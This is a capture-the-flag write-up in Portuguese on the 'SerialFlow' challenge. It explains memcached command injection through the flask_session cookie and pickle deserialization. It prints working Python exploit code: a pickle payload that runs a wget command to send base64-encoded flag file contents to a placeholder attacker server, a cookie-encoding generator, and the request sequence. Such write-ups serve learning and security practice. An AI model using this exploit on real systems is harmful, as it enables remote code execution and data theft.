# SerialFlow

>SerialFlow is the main global network used by KORP, you have managed to reach a root server web interface by traversing KORP's external proxy network. Can you break into the root server and open pandoras box by revealing the truth behind KORP?

Dificuldade: __medium__  
Código-fonte: Disponibilizado

__Obs:__ _Todos os arquivos referenciados foram disponibilizados no desafio._

[Memcached Command Injections at Pylibmc](https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/) é a vulnerabilidade que será explorar nesse desafio.

O artigo mencionado tem muito detalhe de como essa vulnerabilidade funciona, resumirei o que entendi e compartilharei o exploit que utilizei para concluir esse desafio.
`
__Memcached__ é um sistema de cache em memória que, em conjunto com o __flask_session__ apresenta grande risco para as aplicações. Pois, é possível injetar objetos serializados no __Memcached__ e quando esses objetos são carregados pelo __flask_session__ eles são deserializados ocorrendo a injeção de comando.

Os principais comandos que precisamos saber sobre __Memcached__. 
__Obs:__ _As informações foram tiradas do artigo mencionado._

| Command | Format                                                          |
| :------ | :-------------------------------------------------------------- |
| set     | `set <key> <flags> <expiry> <datalen> [noreplay]\r\n<data>\r\n` |
| get     | `get <key>\r\n`                                                 |
- __flag:__ data specific client side flags
- __expiry:__ expiration time (in seconds)
- __datalen:__ size of the data (in bytes)
- __data__: data block

## Como é injetado os comandos?

__Memcached__ suporta tanto texto livre como binários em seu protocolo de comunicação e os comandos são separados por __CRLF__. Então quando o __flask_session__ salva ou carrega as informações no __Memcached__, podemos enviar vários comandos separados por `\r\n`

## Na prática

Nosso desafio utiliza o __Memcached__ + __flask_session___. O ponto de injeção é o `sessionId` que é armazenado no `Cookies` com a key `session`.

Então se realizarmos uma requisição __GET__ para o servidor com o seguinte valor: `session=RANDOM_KEY\r\nset session:1337 0 2592000 1\r\nA\r\n`. 
O __flask_session__ irá buscar o session utilizando o valor que passamos nos cookies. Ou seja, ele irá enviar o comando `get RANDOM_KEY\r\nset session:1337 0 2592000 1\r\nA\r\n` para o __Memcached__. Como o __CRLF__ é utilizado como separador. O __Memcached__ irá interpretar o comando como dois, separando-os no primeiro `\r\n` e executando um `get` e um `set`.

Assim, iremos inserir uma nova session com a `key` 1337, `flag` 0, `expiry` em 2592000 com uma informação de 1 byte de comprimento que é o valor A.

## Exploit

Primeiro iremos criar um objeto para serializar com __pickle__ em python.
```python
class RCE:
    def __reduce__(self):
        cmd = ('wget https://{YOUR_SERVER}?flag=$(cat /flag*.txt | base64)')
        return os.system, (cmd,)
```

Precisamos gerar o payload com o nosso RCE
```python
def generate_exploit(session_id):
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = session_id.encode('utf-8') + b'\r\nset session:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get session:1337')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""
```

Depois iremos realizar duas chamadas para o servidor.
Primeira para salvar o nosso código serializado no __Memcached__
Seguindo para fazer o __flask_session__ carregar o nosso payload e deserializar o nosso código assim executando o nosso comando.
```python
url = "http://{IP}:{PORT}"

response = requests.get(url)
session_id = response.headers['Set-Cookie'].split("session=")[1].split(';')[0]
requests.get(url, cookies={"session": generate_exploit(session_id)})
response = requests.get(url, cookies={"session": "1337"})
print(response.content)
``` 
